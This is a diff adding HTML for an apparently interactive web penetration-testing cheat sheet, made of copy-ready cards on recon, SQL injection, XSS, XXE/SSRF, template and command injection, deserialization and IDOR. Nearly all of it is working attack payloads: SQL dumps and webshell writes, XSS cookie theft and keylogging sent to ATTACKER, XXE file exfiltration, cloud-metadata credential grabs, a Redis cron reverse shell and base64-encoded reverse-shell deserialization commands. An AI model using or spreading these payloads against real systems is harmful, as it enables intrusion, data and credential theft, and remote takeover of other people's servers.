+<div class="cmd" onclick="cp(this)">nmap -p- --min-rate 5000 -oA nmap/allports 1.2.3.4</div>
+<div class="cmd" onclick="cp(this)">masscan -p0-65535 1.2.3.4 --rate=100000 -oL masscan.out</div>
+<div class="cmd" onclick="cp(this)">whatweb -v https://TARGET</div>
+<div class="cmd" onclick="cp(this)">wafw00f https://TARGET</div>
+  </div>
+</div>
+<div class="card" data-sev="high" data-id="r7">
+  <div class="card-hd"><span class="ctitle">JS Secret Mining</span><div class="card-prog"><button class="cp-btn" onclick="markCard('r7','tested',this)">✓</button><button class="cp-btn" onclick="markCard('r7','vuln',this)">⚠</button><button class="cp-btn" onclick="markCard('r7','na',this)">N/A</button></div><span class="sev sh">HIGH VALUE</span></div>
+  <div class="card-bd">
+<div class="cmd" onclick="cp(this)">gau TARGET | grep "\.js$" | httpx -mc 200 | tee jsfiles.txt</div>
+<div class="cmd" onclick="cp(this)">secretfinder -i https://TARGET/app.js -o cli</div>
+<div class="cmd" onclick="cp(this)">nuclei -u https://TARGET -t exposures/ -t misconfiguration/</div>
+<div class="cmd" onclick="cp(this)">katana -u https://TARGET -jc -d 5 -o endpoints.txt</div>
+<div class="cmd" onclick="cp(this)">ffuf -u https://TARGET/FUZZ -w WORDLIST -mc 200,301,302,403 -o ffuf.json</div>
+  </div>
+</div>
+</div>
+</div>
+
+<!-- ░░ SQLI ░░ -->
+<div id="sec-sqli" class="section">
+<div class="shdr"><div class="sico">💉</div><div><div class="stitle">SQL INJECTION</div><div class="sdesc">// error-based — blind — time-based — OOB — second-order — WAF bypass</div></div></div>
+<div class="pathway-title">Attack Pathway</div>
+<div style="display:flex;align-items:center;gap:8px;margin-bottom:26px;">
+<button onclick="pathPrev(this)" style="flex-shrink:0;background:var(--panel2);border:1px solid var(--border2);color:var(--dim);width:28px;height:28px;border-radius:4px;cursor:pointer;font-size:16px;font-family:monospace;transition:all .2s;display:flex;align-items:center;justify-content:center;" onmouseover="this.style.color='var(--accent)';this.style.borderColor='var(--accent)'" onmouseout="this.style.color='var(--dim)';this.style.borderColor='var(--border2)'">&#8249;</button>
+<div class="pathway" style="flex:1;margin-bottom:0;">
+  <div class="pstep current" onclick="stepClick(this)"><div class="ps-num">1</div><div class="ps-lbl">Detect Injection</div></div>
+  <div class="pstep" onclick="stepClick(this)"><div class="ps-num">2</div><div class="ps-lbl">Identify DB Type</div></div>
+  <div class="pstep" onclick="stepClick(this)"><div class="ps-num">3</div><div class="ps-lbl">Extract Schema</div></div>
+  <div class="pstep" onclick="stepClick(this)"><div class="ps-num">4</div><div class="ps-lbl">Dump Data</div></div>
+  <div class="pstep" onclick="stepClick(this)"><div class="ps-num">5</div><div class="ps-lbl">WAF Bypass</div></div>
+  <div class="pstep" onclick="stepClick(this)"><div class="ps-num">6</div><div class="ps-lbl">OS Shell / RCE</div></div>
+</div>
+<button onclick="pathNext(this)" style="flex-shrink:0;background:var(--panel2);border:1px solid var(--border2);color:var(--dim);width:28px;height:28px;border-radius:4px;cursor:pointer;font-size:16px;font-family:monospace;transition:all .2s;display:flex;align-items:center;justify-content:center;" onmouseover="this.style.color='var(--accent)';this.style.borderColor='var(--accent)'" onmouseout="this.style.color='var(--dim)';this.style.borderColor='var(--border2)'">&#8250;</button>
+</div>
+<div class="cgrid">
+<div class="card" data-sev="high" data-id="sq1">
+  <div class="card-hd"><span class="ctitle">Detection Payloads</span><div class="card-prog"><button class="cp-btn" onclick="markCard('sq1','tested',this)">✓</button><button class="cp-btn" onclick="markCard('sq1','vuln',this)">⚠</button><button class="cp-btn" onclick="markCard('sq1','na',this)">N/A</button></div><span class="sev sh">DETECT</span></div>
+  <div class="card-bd">
+<div class="payload" onclick="cp(this)">'
+''
+`
+')
+'))
+"; -- -
+' OR 1=1-- -
+1' ORDER BY 10-- -
+' AND SLEEP(5)-- -
+\</div>
+  </div>
+</div>
+<div class="card" data-sev="critical" data-id="sq2">
+  <div class="card-hd"><span class="ctitle">SQLMap Automation</span><div class="card-prog"><button class="cp-btn" onclick="markCard('sq2','tested',this)">✓</button><button class="cp-btn" onclick="markCard('sq2','vuln',this)">⚠</button><button class="cp-btn" onclick="markCard('sq2','na',this)">N/A</button></div><span class="sev sc">CRITICAL</span></div>
+  <div class="card-bd">
+<div class="cmd" onclick="cp(this)">sqlmap -u "https://TARGET/page?PARAM=1" --dbs --batch</div>
+<div class="cmd" onclick="cp(this)">sqlmap -u "https://TARGET/page?PARAM=1" -D dbname -T users --dump</div>
+<div class="cmd" onclick="cp(this)">sqlmap -r request.txt --level=5 --risk=3 --batch --dbs</div>
+<div class="cmd" onclick="cp(this)">sqlmap -u "https://TARGET/api/user" --data='{"PARAM":"1"}' --dbs --dbms=mysql</div>
+<div class="cmd" onclick="cp(this)">sqlmap -r req.txt --os-shell --technique=B</div>
+<div class="cmd" onclick="cp(this)">sqlmap -r req.txt --tamper=space2comment,between,randomcase --level=5</div>
+  </div>
+</div>
+<div class="card" data-sev="critical" data-id="sq3">
+  <div class="card-hd"><span class="ctitle">Error-Based Extraction</span><div class="card-prog"><button class="cp-btn" onclick="markCard('sq3','tested',this)">✓</button><button class="cp-btn" onclick="markCard('sq3','vuln',this)">⚠</button><button class="cp-btn" onclick="markCard('sq3','na',this)">N/A</button></div><span class="sev sc">CRITICAL</span></div>
+  <div class="card-bd">
+<div class="cglbl">MySQL</div>
+<div class="payload" onclick="cp(this)">' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version())))-- -
+' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECT database()),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- -</div>
+<div class="cglbl">MSSQL</div>
+<div class="payload" onclick="cp(this)">' AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))-- -</div>
+<div class="cglbl">PostgreSQL</div>
+<div class="payload" onclick="cp(this)">' AND CAST((SELECT version()) AS int)-- -</div>
+  </div>
+</div>
+<div class="card" data-sev="critical" data-id="sq4">
+  <div class="card-hd"><span class="ctitle">Time-Based Blind SQLi</span><div class="card-prog"><button class="cp-btn" onclick="markCard('sq4','tested',this)">✓</button><button class="cp-btn" onclick="markCard('sq4','vuln',this)">⚠</button><button class="cp-btn" onclick="markCard('sq4','na',this)">N/A</button></div><span class="sev sc">BLIND</span></div>
+  <div class="card-bd">
+<div class="payload" onclick="cp(this)"># MySQL
+' AND SLEEP(5)-- -
+' AND IF(SUBSTRING(database(),1,1)='a',SLEEP(5),0)-- -
+# MSSQL
+'; WAITFOR DELAY '0:0:5'-- -
+# PostgreSQL
+'; SELECT pg_sleep(5)-- -
+# Oracle
+' AND 1=DBMS_PIPE.RECEIVE_MESSAGE(CHR(97),5)-- -</div>
+  </div>
+</div>
+<div class="card" data-sev="critical" data-id="sq5">
+  <div class="card-hd"><span class="ctitle">UNION-Based Extraction</span><div class="card-prog"><button class="cp-btn" onclick="markCard('sq5','tested',this)">✓</button><button class="cp-btn" onclick="markCard('sq5','vuln',this)">⚠</button><button class="cp-btn" onclick="markCard('sq5','na',this)">N/A</button></div><span class="sev sc">CRITICAL</span></div>
+  <div class="card-bd">
+<div class="payload" onclick="cp(this)"># Determine column count
+' ORDER BY 1-- -   (increment until error)
+# Identify visible columns
+' UNION SELECT NULL,NULL,NULL-- -
+# Extract
+' UNION SELECT username,password,NULL FROM users-- -
+' UNION SELECT NULL,GROUP_CONCAT(username,':',password),NULL FROM users-- -
+# MySQL read file
+' UNION SELECT NULL,LOAD_FILE('/etc/passwd'),NULL-- -
+# MySQL write webshell
+' UNION SELECT NULL,'&lt;?php system($_GET[0]);?&gt;',NULL INTO OUTFILE '/var/www/html/sh.php'-- -</div>
+  </div>
+</div>
+<div class="card" data-sev="advanced" data-id="sq6">
+  <div class="card-hd"><span class="ctitle">OOB + Second-Order + WAF Bypass</span><div class="card-prog"><button class="cp-btn" onclick="markCard('sq6','tested',this)">✓</button><button class="cp-btn" onclick="markCard('sq6','vuln',this)">⚠</button><button class="cp-btn" onclick="markCard('sq6','na',this)">N/A</button></div><span class="sev sa">ADVANCED</span></div>
+  <div class="card-bd">
+<div class="cglbl">OOB — MySQL DNS Exfil</div>
+<div class="payload" onclick="cp(this)">' AND LOAD_FILE(CONCAT('\\\\\\\\',( SELECT password FROM users LIMIT 1),'.ATTACKER\\\\a'))-- -</div>
+<div class="cglbl">OOB — MSSQL xp_dirtree</div>
+<div class="payload" onclick="cp(this)">'; exec master..xp_dirtree '\\\\ATTACKER\\a'-- -</div>
+<div class="cglbl">WAF Bypass</div>
+<div class="payload" onclick="cp(this)">SELECT/**/username/**/FROM/**/users
+/*!50000 SELECT*/ * FROM users
+SeLeCt * FrOm users</div>
+<div class="cglbl">Second-Order</div>
+<div class="payload" onclick="cp(this)"># Register as: admin'-- -
+# Later triggers: UPDATE users SET pass='x' WHERE username='admin'-- -'</div>
+  </div>
+</div>
+</div>
+</div>
+
+<!-- ░░ XSS ░░ -->
+<div id="sec-xss" class="section">
+<div class="shdr"><div class="sico">📜</div><div><div class="stitle">XSS — CROSS-SITE SCRIPTING</div><div class="sdesc">// reflected — stored — DOM — blind XSS — CSP bypass — exploitation chains</div></div></div>
+<div class="pathway-title">Attack Pathway</div>
+<div style="display:flex;align-items:center;gap:8px;margin-bottom:26px;">
+<button onclick="pathPrev(this)" style="flex-shrink:0;background:var(--panel2);border:1px solid var(--border2);color:var(--dim);width:28px;height:28px;border-radius:4px;cursor:pointer;font-size:16px;font-family:monospace;transition:all .2s;display:flex;align-items:center;justify-content:center;" onmouseover="this.style.color='var(--accent)';this.style.borderColor='var(--accent)'" onmouseout="this.style.color='var(--dim)';this.style.borderColor='var(--border2)'">&#8249;</button>
+<div class="pathway" style="flex:1;margin-bottom:0;">
+  <div class="pstep current" onclick="stepClick(this)"><div class="ps-num">1</div><div class="ps-lbl">Find Reflection</div></div>
+  <div class="pstep" onclick="stepClick(this)"><div class="ps-num">2</div><div class="ps-lbl">Break Context</div></div>
+  <div class="pstep" onclick="stepClick(this)"><div class="ps-num">3</div><div class="ps-lbl">Bypass Filters</div></div>
+  <div class="pstep" onclick="stepClick(this)"><div class="ps-num">4</div><div class="ps-lbl">Bypass CSP</div></div>
+  <div class="pstep" onclick="stepClick(this)"><div class="ps-num">5</div><div class="ps-lbl">Exploit / Exfil</div></div>
+  <div class="pstep" onclick="stepClick(this)"><div class="ps-num">6</div><div class="ps-lbl">Escalate</div></div>
+</div>
+<button onclick="pathNext(this)" style="flex-shrink:0;background:var(--panel2);border:1px solid var(--border2);color:var(--dim);width:28px;height:28px;border-radius:4px;cursor:pointer;font-size:16px;font-family:monospace;transition:all .2s;display:flex;align-items:center;justify-content:center;" onmouseover="this.style.color='var(--accent)';this.style.borderColor='var(--accent)'" onmouseout="this.style.color='var(--dim)';this.style.borderColor='var(--border2)'">&#8250;</button>
+</div>
+<div class="cgrid">
+<div class="card" data-sev="high" data-id="x1">
+  <div class="card-hd"><span class="ctitle">Detection Payloads</span><div class="card-prog"><button class="cp-btn" onclick="markCard('x1','tested',this)">✓</button><button class="cp-btn" onclick="markCard('x1','vuln',this)">⚠</button><button class="cp-btn" onclick="markCard('x1','na',this)">N/A</button></div><span class="sev sh">XSS</span></div>
+  <div class="card-bd">
+<div class="payload" onclick="cp(this)">&lt;script&gt;alert(1)&lt;/script&gt;
+&lt;img src=x onerror=alert(1)&gt;
+&lt;svg onload=alert(1)&gt;
+"&gt;&lt;script&gt;alert(1)&lt;/script&gt;
+'&gt;&lt;img src=x onerror=alert(1)&gt;
+&lt;details open ontoggle=alert(1)&gt;
+&lt;input autofocus onfocus=alert(1)&gt;
+&lt;iframe onload=alert(1)&gt;&lt;/iframe&gt;</div>
+  </div>
+</div>
+<div class="card" data-sev="advanced" data-id="x2">
+  <div class="card-hd"><span class="ctitle">Filter / WAF Bypass</span><div class="card-prog"><button class="cp-btn" onclick="markCard('x2','tested',this)">✓</button><button class="cp-btn" onclick="markCard('x2','vuln',this)">⚠</button><button class="cp-btn" onclick="markCard('x2','na',this)">N/A</button></div><span class="sev sa">BYPASS</span></div>
+  <div class="card-bd">
+<div class="payload" onclick="cp(this)"># Entity encoding
+&lt;img src=x onerror=&#97;lert(1)&gt;
+&lt;script&gt;eval(atob('YWxlcnQoMSk='))&lt;/script&gt;
+# Case / whitespace
+&lt;ScRiPt&gt;alert(1)&lt;/sCrIpT&gt;
+&lt;img/src=x/onerror=alert(1)&gt;
+# Alternate events
+&lt;body/onpageshow=alert(1)&gt;
+&lt;video&gt;&lt;source onerror=alert(1)&gt;
+# Angular bypass
+{{constructor.constructor('alert(1)')()}}</div>
+  </div>
+</div>
+<div class="card" data-sev="advanced" data-id="x3">
+  <div class="card-hd"><span class="ctitle">CSP Bypass</span><div class="card-prog"><button class="cp-btn" onclick="markCard('x3','tested',this)">✓</button><button class="cp-btn" onclick="markCard('x3','vuln',this)">⚠</button><button class="cp-btn" onclick="markCard('x3','na',this)">N/A</button></div><span class="sev sa">ADVANCED</span></div>
+  <div class="card-bd">
+<div class="payload" onclick="cp(this)"># JSONP on allowed CDN
+&lt;script src="https://cdn.allowed.com/api?callback=alert(1)//"&gt;&lt;/script&gt;
+# base-uri missing
+&lt;base href="https://ATTACKER/"&gt;
+# Nonce reuse
+&lt;script nonce="LEAKED_NONCE"&gt;alert(1)&lt;/script&gt;
+# Dangling markup exfil
+&lt;img src="https://ATTACKER/?x=</div>
+<div class="note">Use csp-evaluator.withgoogle.com to analyze first.</div>
+  </div>
+</div>
+<div class="card" data-sev="critical" data-id="x4">
+  <div class="card-hd"><span class="ctitle">XSS Exploitation Payloads</span><div class="card-prog"><button class="cp-btn" onclick="markCard('x4','tested',this)">✓</button><button class="cp-btn" onclick="markCard('x4','vuln',this)">⚠</button><button class="cp-btn" onclick="markCard('x4','na',this)">N/A</button></div><span class="sev sc">EXPLOIT</span></div>
+  <div class="card-bd">
+<div class="payload" onclick="cp(this)"># Cookie theft
+&lt;script&gt;document.location='https://ATTACKER/?c='+document.cookie&lt;/script&gt;
+# Keylogger
+&lt;script&gt;document.onkeypress=function(e){fetch('https://ATTACKER/k?k='+e.key)}&lt;/script&gt;
+# Grab page HTML
+&lt;script&gt;fetch('https://ATTACKER/?b='+btoa(document.body.innerHTML))&lt;/script&gt;
+# CSRF via XSS — add admin
+&lt;script&gt;fetch('/api/admin/adduser',{method:'POST',headers:{'Content-Type':'application/json'},body:'{"user":"hacker","role":"admin"}'})&lt;/script&gt;</div>
+  </div>
+</div>
+<div class="card" data-sev="advanced" data-id="x5">
+  <div class="card-hd"><span class="ctitle">Blind XSS</span><div class="card-prog"><button class="cp-btn" onclick="markCard('x5','tested',this)">✓</button><button class="cp-btn" onclick="markCard('x5','vuln',this)">⚠</button><button class="cp-btn" onclick="markCard('x5','na',this)">N/A</button></div><span class="sev sa">BLIND</span></div>
+  <div class="card-bd">
+<div class="payload" onclick="cp(this)">"&gt;&lt;script src=https://yourxsshunter.xss.ht&gt;&lt;/script&gt;
+"&gt;&lt;script&gt;var x=new XMLHttpRequest();x.open('GET','https://ATTACKER/?d='+btoa(document.body.innerHTML));x.send();&lt;/script&gt;</div>
+<div class="note">Inject in: contact forms, User-Agent, Referer, username, support tickets, admin notes.</div>
+  </div>
+</div>
+<div class="card" data-sev="advanced" data-id="x6">
+  <div class="card-hd"><span class="ctitle">DOM-Based XSS</span><div class="card-prog"><button class="cp-btn" onclick="markCard('x6','tested',this)">✓</button><button class="cp-btn" onclick="markCard('x6','vuln',this)">⚠</button><button class="cp-btn" onclick="markCard('x6','na',this)">N/A</button></div><span class="sev sa">DOM</span></div>
+  <div class="card-bd">
+<table class="dtbl">
+<thead><tr><th>Source</th><th>Dangerous Sink</th></tr></thead>
+<tbody>
+<tr><td class="mono">location.hash</td><td class="red">innerHTML</td></tr>
+<tr><td class="mono">location.search</td><td class="red">eval()</td></tr>
+<tr><td class="mono">document.referrer</td><td class="red">document.write()</td></tr>
+<tr><td class="mono">postMessage data</td><td class="red">src / href</td></tr>
+</tbody>
+</table>
+<div class="cmd" onclick="cp(this)">dalfox url https://TARGET/page?PARAM=XSS</div>
+  </div>
+</div>
+</div>
+</div>
+
+<!-- ░░ XXE/SSRF ░░ -->
+<div id="sec-xxe" class="section">
+<div class="shdr"><div class="sico">🧬</div><div><div class="stitle">XXE / SSRF</div><div class="sdesc">// XML external entity — server-side request forgery — cloud metadata — Gopher chains</div></div></div>
+<div class="pathway-title">Attack Pathway</div>
+<div style="display:flex;align-items:center;gap:8px;margin-bottom:26px;">
+<button onclick="pathPrev(this)" style="flex-shrink:0;background:var(--panel2);border:1px solid var(--border2);color:var(--dim);width:28px;height:28px;border-radius:4px;cursor:pointer;font-size:16px;font-family:monospace;transition:all .2s;display:flex;align-items:center;justify-content:center;" onmouseover="this.style.color='var(--accent)';this.style.borderColor='var(--accent)'" onmouseout="this.style.color='var(--dim)';this.style.borderColor='var(--border2)'">&#8249;</button>
+<div class="pathway" style="flex:1;margin-bottom:0;">
+  <div class="pstep current" onclick="stepClick(this)"><div class="ps-num">1</div><div class="ps-lbl">Find XML/URL</div></div>
+  <div class="pstep" onclick="stepClick(this)"><div class="ps-num">2</div><div class="ps-lbl">Basic Read</div></div>
+  <div class="pstep" onclick="stepClick(this)"><div class="ps-num">3</div><div class="ps-lbl">OOB Exfil</div></div>
+  <div class="pstep" onclick="stepClick(this)"><div class="ps-num">4</div><div class="ps-lbl">Internal Scan</div></div>
+  <div class="pstep" onclick="stepClick(this)"><div class="ps-num">5</div><div class="ps-lbl">Cloud Metadata</div></div>
+  <div class="pstep" onclick="stepClick(this)"><div class="ps-num">6</div><div class="ps-lbl">RCE Chain</div></div>
+</div>
+<button onclick="pathNext(this)" style="flex-shrink:0;background:var(--panel2);border:1px solid var(--border2);color:var(--dim);width:28px;height:28px;border-radius:4px;cursor:pointer;font-size:16px;font-family:monospace;transition:all .2s;display:flex;align-items:center;justify-content:center;" onmouseover="this.style.color='var(--accent)';this.style.borderColor='var(--accent)'" onmouseout="this.style.color='var(--dim)';this.style.borderColor='var(--border2)'">&#8250;</button>
+</div>
+<div class="cgrid">
+<div class="card" data-sev="critical" data-id="xxe1">
+  <div class="card-hd"><span class="ctitle">Basic XXE + OOB</span><div class="card-prog"><button class="cp-btn" onclick="markCard('xxe1','tested',this)">✓</button><button class="cp-btn" onclick="markCard('xxe1','vuln',this)">⚠</button><button class="cp-btn" onclick="markCard('xxe1','na',this)">N/A</button></div><span class="sev sc">XXE</span></div>
+  <div class="card-bd">
+<div class="payload" onclick="cp(this)">&lt;?xml version="1.0"?&gt;
+&lt;!DOCTYPE root [
+  &lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;
+]&gt;
+&lt;root&gt;&amp;xxe;&lt;/root&gt;</div>
+<div class="cglbl">OOB (evil.dtd hosted on ATTACKER)</div>
+<div class="payload" onclick="cp(this)">&lt;!ENTITY % file SYSTEM "file:///etc/passwd"&gt;
+&lt;!ENTITY % eval "&lt;!ENTITY &amp;#x25; exfil SYSTEM 'http://ATTACKER/?f=%file;'&gt;"&gt;
+%eval;
+%exfil;</div>
+  </div>
+</div>
+<div class="card" data-sev="critical" data-id="xxe2">
+  <div class="card-hd"><span class="ctitle">SSRF Payloads + Cloud Metadata</span><div class="card-prog"><button class="cp-btn" onclick="markCard('xxe2','tested',this)">✓</button><button class="cp-btn" onclick="markCard('xxe2','vuln',this)">⚠</button><button class="cp-btn" onclick="markCard('xxe2','na',this)">N/A</button></div><span class="sev sc">SSRF</span></div>
+  <div class="card-bd">
+<div class="payload" onclick="cp(this)">url=http://127.0.0.1/
+url=http://169.254.169.254/latest/meta-data/iam/security-credentials/
+url=http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
+url=http://169.254.169.254/metadata/instance?api-version=2021-02-01</div>
+<div class="cglbl">Filter Bypass</div>
+<div class="payload" onclick="cp(this)">http://0/       http://127.1/
+http://2130706433/     (127.0.0.1 decimal)
+http://0x7f000001/     (127.0.0.1 hex)
+http://[::1]/
+http://ATTACKER/redirect?url=http://169.254.169.254/</div>
+  </div>
+</div>
+<div class="card" data-sev="advanced" data-id="xxe3">
+  <div class="card-hd"><span class="ctitle">SSRF → RCE Chains</span><div class="card-prog"><button class="cp-btn" onclick="markCard('xxe3','tested',this)">✓</button><button class="cp-btn" onclick="markCard('xxe3','vuln',this)">⚠</button><button class="cp-btn" onclick="markCard('xxe3','na',this)">N/A</button></div><span class="sev sa">ADVANCED</span></div>
+  <div class="card-bd">
+<div class="chain"><div class="cs blue">SSRF</div><div class="ca">→</div><div class="cs">Redis :6379</div><div class="ca">→</div><div class="cs red">Cron RCE</div></div>
+<div class="payload" onclick="cp(this)">gopher://127.0.0.1:6379/_%0D%0ASET%20shell%20%22%0A%0A%0A*/1%20*%20*%20*%20*%20bash%20-i%20%3E%26%20/dev/tcp/ATTACKER/PORT%200%3E%261%0A%0A%0A%22%0D%0ACONFIG%20SET%20dir%20/var/spool/cron/%0D%0ACONFIG%20SET%20dbfilename%20root%0D%0ASAVE%0D%0A</div>
+<div class="chain" style="margin-top:8px;"><div class="cs blue">SSRF</div><div class="ca">→</div><div class="cs purple">AWS IMDSv1</div><div class="ca">→</div><div class="cs red">Full Cloud Access</div></div>
+  </div>
+</div>
+</div>
+</div>
+
+<!-- ░░ SSTI ░░ -->
+<div id="sec-ssti" class="section">
+<div class="shdr"><div class="sico">⚙️</div><div><div class="stitle">SSTI / RCE</div><div class="sdesc">// server-side template injection — command injection — deserialization — SpEL</div></div></div>
+<div class="pathway-title">Attack Pathway</div>
+<div style="display:flex;align-items:center;gap:8px;margin-bottom:26px;">
+<button onclick="pathPrev(this)" style="flex-shrink:0;background:var(--panel2);border:1px solid var(--border2);color:var(--dim);width:28px;height:28px;border-radius:4px;cursor:pointer;font-size:16px;font-family:monospace;transition:all .2s;display:flex;align-items:center;justify-content:center;" onmouseover="this.style.color='var(--accent)';this.style.borderColor='var(--accent)'" onmouseout="this.style.color='var(--dim)';this.style.borderColor='var(--border2)'">&#8249;</button>
+<div class="pathway" style="flex:1;margin-bottom:0;">
+  <div class="pstep current" onclick="stepClick(this)"><div class="ps-num">1</div><div class="ps-lbl">Detect SSTI</div></div>
+  <div class="pstep" onclick="stepClick(this)"><div class="ps-num">2</div><div class="ps-lbl">ID Engine</div></div>
+  <div class="pstep" onclick="stepClick(this)"><div class="ps-num">3</div><div class="ps-lbl">Sandbox Escape</div></div>
+  <div class="pstep" onclick="stepClick(this)"><div class="ps-num">4</div><div class="ps-lbl">RCE</div></div>
+  <div class="pstep" onclick="stepClick(this)"><div class="ps-num">5</div><div class="ps-lbl">Reverse Shell</div></div>
+  <div class="pstep" onclick="stepClick(this)"><div class="ps-num">6</div><div class="ps-lbl">Persist</div></div>
+</div>
+<button onclick="pathNext(this)" style="flex-shrink:0;background:var(--panel2);border:1px solid var(--border2);color:var(--dim);width:28px;height:28px;border-radius:4px;cursor:pointer;font-size:16px;font-family:monospace;transition:all .2s;display:flex;align-items:center;justify-content:center;" onmouseover="this.style.color='var(--accent)';this.style.borderColor='var(--accent)'" onmouseout="this.style.color='var(--dim)';this.style.borderColor='var(--border2)'">&#8250;</button>
+</div>
+<div class="cgrid">
+<div class="card" data-sev="critical" data-id="st1">
+  <div class="card-hd"><span class="ctitle">Detection + Engine ID</span><div class="card-prog"><button class="cp-btn" onclick="markCard('st1','tested',this)">✓</button><button class="cp-btn" onclick="markCard('st1','vuln',this)">⚠</button><button class="cp-btn" onclick="markCard('st1','na',this)">N/A</button></div><span class="sev sc">SSTI</span></div>
+  <div class="card-bd">
+<div class="payload" onclick="cp(this)">${{&lt;%['"}}%\.           ← triggers all engines
+{{7*7}}     49 = Jinja2 / Twig
+${7*7}      49 = Freemarker / Spring
+&lt;%= 7*7 %&gt; 49 = ERB (Ruby)
+*{7*7}      49 = Spring SpEL
+{{7*'7'}}   49=Jinja2  7777777=Twig</div>
+  </div>
+</div>
+<div class="card" data-sev="critical" data-id="st2">
+  <div class="card-hd"><span class="ctitle">Jinja2 RCE (Python)</span><div class="card-prog"><button class="cp-btn" onclick="markCard('st2','tested',this)">✓</button><button class="cp-btn" onclick="markCard('st2','vuln',this)">⚠</button><button class="cp-btn" onclick="markCard('st2','na',this)">N/A</button></div><span class="sev sc">RCE</span></div>
+  <div class="card-bd">
+<div class="payload" onclick="cp(this)">{{ config.__class__.__init__.__globals__['os'].popen('id').read() }}
+{{ cycler.__init__.__globals__.os.popen('id').read() }}
+{{ ''.__class__.__mro__[1].__subclasses__()[396]('id',shell=True,stdout=-1).communicate() }}</div>
+  </div>
+</div>
+<div class="card" data-sev="critical" data-id="st3">
+  <div class="card-hd"><span class="ctitle">Twig / FreeMarker / Velocity</span><div class="card-prog"><button class="cp-btn" onclick="markCard('st3','tested',this)">✓</button><button class="cp-btn" onclick="markCard('st3','vuln',this)">⚠</button><button class="cp-btn" onclick="markCard('st3','na',this)">N/A</button></div><span class="sev sc">RCE</span></div>
+  <div class="card-bd">
+<div class="payload" onclick="cp(this)"># Twig (PHP)
+{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
+# FreeMarker (Java)
+&lt;#assign ex="freemarker.template.utility.Execute"?new()&gt;${ ex("id")}
+# Velocity (Java)
+#set($str=$class.inspect("java.lang.Runtime").type)
+#set($rt=$str.getMethod("getRuntime").invoke($str))
+#set($p=$rt.exec("id"))$p.text</div>
+  </div>
+</div>
+<div class="card" data-sev="critical" data-id="st4">
+  <div class="card-hd"><span class="ctitle">Command Injection</span><div class="card-prog"><button class="cp-btn" onclick="markCard('st4','tested',this)">✓</button><button class="cp-btn" onclick="markCard('st4','vuln',this)">⚠</button><button class="cp-btn" onclick="markCard('st4','na',this)">N/A</button></div><span class="sev sc">RCE</span></div>
+  <div class="card-bd">
+<div class="payload" onclick="cp(this)">; id
+&amp;&amp; id
+|| id
+| id
+`id`
+$(id)
+%0a id
+# No-space bypass
+{cat,/etc/passwd}
+cat${IFS}/etc/passwd
+# OOB blind
+; curl http://ATTACKER/$(id|base64)</div>
+  </div>
+</div>
+<div class="card" data-sev="advanced" data-id="st5">
+  <div class="card-hd"><span class="ctitle">Java Deserialization</span><div class="card-prog"><button class="cp-btn" onclick="markCard('st5','tested',this)">✓</button><button class="cp-btn" onclick="markCard('st5','vuln',this)">⚠</button><button class="cp-btn" onclick="markCard('st5','na',this)">N/A</button></div><span class="sev sa">ADVANCED</span></div>
+  <div class="card-bd">
+<div class="desc">Magic bytes: <code>rO0AB</code> (base64) or <code>AC ED 00 05</code> (hex)</div>
+<div class="cmd" onclick="cp(this)">ysoserial CommonsCollections5 'curl http://ATTACKER/$(id|base64)' | base64 -w0</div>
+<div class="cmd" onclick="cp(this)">java -jar ysoserial.jar Groovy1 'bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC9BVFRBQy9QT1JUIDB+JjE=}|{base64,-d}|bash' &gt; payload.ser</div>
+  </div>
+</div>
+</div>
+</div>
+
+<!-- ░░ IDOR ░░ -->
+<div id="sec-idor" class="section">
+<div class="shdr"><div class="sico">🔓</div><div><div class="stitle">IDOR / AUTHORIZATION BYPASS</div><div class="sdesc">// BOLA — mass assignment — privilege escalation — header bypass — function level</div></div></div>
+<div class="pathway-title">Attack Pathway</div>
+<div style="display:flex;align-items:center;gap:8px;margin-bottom:26px;">
+<button onclick="pathPrev(this)" style="flex-shrink:0;background:var(--panel2);border:1px solid var(--border2);color:var(--dim);width:28px;height:28px;border-radius:4px;cursor:pointer;font-size:16px;font-family:monospace;transition:all .2s;display:flex;align-items:center;justify-content:center;" onmouseover="this.style.color='var(--accent)';this.style.borderColor='var(--accent)'" onmouseout="this.style.color='var(--dim)';this.style.borderColor='var(--border2)'">&#8249;</button>
+<div class="pathway" style="flex:1;margin-bottom:0;">
+  <div class="pstep current" onclick="stepClick(this)"><div class="ps-num">1</div><div class="ps-lbl">Map Objects</div></div>
+  <div class="pstep" onclick="stepClick(this)"><div class="ps-num">2</div><div class="ps-lbl">Horizontal IDOR</div></div>
+  <div class="pstep" onclick="stepClick(this)"><div class="ps-num">3</div><div class="ps-lbl">Vertical PrivEsc</div></div>
+  <div class="pstep" onclick="stepClick(this)"><div class="ps-num">4</div><div class="ps-lbl">Header Bypass</div></div>
+  <div class="pstep" onclick="stepClick(this)"><div class="ps-num">5</div><div class="ps-lbl">Mass Assignment</div></div>
+  <div class="pstep" onclick="stepClick(this)"><div class="ps-num">6</div><div class="ps-lbl">Func Level Auth</div></div>
+</div>
+<button onclick="pathNext(this)" style="flex-shrink:0;background:var(--panel2);border:1px solid var(--border2);color:var(--dim);width:28px;height:28px;border-radius:4px;cursor:pointer;font-size:16px;font-family:monospace;transition:all .2s;display:flex;align-items:center;justify-content:center;" onmouseover="this.style.color='var(--accent)';this.style.borderColor='var(--accent)'" onmouseout="this.style.color='var(--dim)';this.style.borderColor='var(--border2)'">&#8250;</button>
+</div>
+<div class="cgrid">
+<div class="card" data-sev="critical" data-id="id1">
+  <div class="card-hd"><span class="ctitle">IDOR Techniques</span><div class="card-prog"><button class="cp-btn" onclick="markCard('id1','tested',this)">✓</button><button class="cp-btn" onclick="markCard('id1','vuln',this)">⚠</button><button class="cp-btn" onclick="markCard('id1','na',this)">N/A</button></div><span class="sev sc">BOLA</span></div>
+  <div class="card-bd">
+<div class="payload" onclick="cp(this)">GET /api/user/1337 → /api/user/1336
+{"id": 1337} → {"id": [1337]}        (array wrap)
+{"id": 1337} → {"id": {"id": 1337}}  (object wrap)
+{"id": "1337abc"}                     (type juggling)
+GET /api/orders?user_id=VICTIM_ID
+GET /api/orders?user_id=mine&amp;user_id=VICTIM (HPP)</div>
+  </div>
+</div>
